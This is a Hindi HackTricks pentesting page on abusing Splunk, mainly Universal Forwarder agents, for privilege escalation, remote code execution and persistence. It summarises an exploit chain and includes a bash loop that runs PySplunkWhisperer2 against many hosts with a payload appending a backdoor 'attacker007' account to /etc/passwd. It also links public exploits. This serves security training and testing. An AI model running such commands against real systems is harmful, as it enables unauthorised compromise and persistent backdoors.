# Splunk LPE और स्थिरता

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

यदि **आंतरिक** या **बाहरी** रूप से किसी मशीन का **गणना** करते समय आपको **Splunk चलाते हुए** (पोर्ट 8090) मिलता है, यदि आपको किसी **मान्य क्रेडेंशियल** का पता है तो आप **Splunk सेवा का दुरुपयोग** करके **एक शेल** को उस उपयोगकर्ता के रूप में **निष्पादित** कर सकते हैं जो Splunk चला रहा है। यदि रूट इसे चला रहा है, तो आप रूट तक विशेषाधिकार बढ़ा सकते हैं।

यदि आप **पहले से ही रूट हैं और Splunk सेवा केवल लोकलहोस्ट पर सुन नहीं रही है**, तो आप **Splunk सेवा से** **पासवर्ड** फ़ाइल **चुरा सकते हैं** और **पासवर्ड** को **क्रैक** कर सकते हैं, या इसमें **नए** क्रेडेंशियल **जोड़ सकते हैं**। और होस्ट पर स्थिरता बनाए रख सकते हैं।

नीचे पहले चित्र में आप देख सकते हैं कि एक Splunkd वेब पृष्ठ कैसा दिखता है।

## Splunk यूनिवर्सल फॉरवर्डर एजेंट एक्सप्लॉइट सारांश

अधिक विवरण के लिए पोस्ट देखें [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)। यह केवल एक सारांश है:

**एक्सप्लॉइट अवलोकन:**
Splunk यूनिवर्सल फॉरवर्डर एजेंट (UF) को लक्षित करने वाला एक एक्सप्लॉइट उन हमलावरों को अनुमति देता है जिनके पास एजेंट पासवर्ड है, एजेंट चला रहे सिस्टम पर मनमाना कोड निष्पादित करने के लिए, संभावित रूप से पूरे नेटवर्क को समझौता कर सकता है।

**मुख्य बिंदु:**
- UF एजेंट आने वाले कनेक्शनों या कोड की प्रामाणिकता को मान्य नहीं करता है, जिससे यह अनधिकृत कोड निष्पादन के लिए संवेदनशील हो जाता है।
- सामान्य पासवर्ड अधिग्रहण विधियों में उन्हें नेटवर्क निर्देशिकाओं, फ़ाइल शेयरों, या आंतरिक दस्तावेज़ों में ढूंढना शामिल है।
- सफल दुरुपयोग से समझौता किए गए होस्ट पर SYSTEM या रूट स्तर की पहुंच, डेटा निकासी, और आगे के नेटवर्क में घुसपैठ हो सकती है।

**एक्सप्लॉइट निष्पादन:**
1. हमलावर UF एजेंट पासवर्ड प्राप्त करता है।
2. एजेंटों को आदेश या स्क्रिप्ट भेजने के लिए Splunk API का उपयोग करता है।
3. संभावित क्रियाओं में फ़ाइल निष्कर्षण, उपयोगकर्ता खाता हेरफेर, और सिस्टम समझौता शामिल हैं।

**प्रभाव:**
- प्रत्येक होस्ट पर SYSTEM/रूट स्तर की अनुमतियों के साथ पूर्ण नेटवर्क समझौता।
- पहचान से बचने के लिए लॉगिंग को अक्षम करने की संभावना।
- बैकडोर या रैनसमवेयर की स्थापना।

**दुरुपयोग के लिए उदाहरण आदेश:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**उपयोगी सार्वजनिक एक्सप्लॉइट्स:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Splunk क्वेरीज़ का दुरुपयोग

**अधिक जानकारी के लिए पोस्ट देखें [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
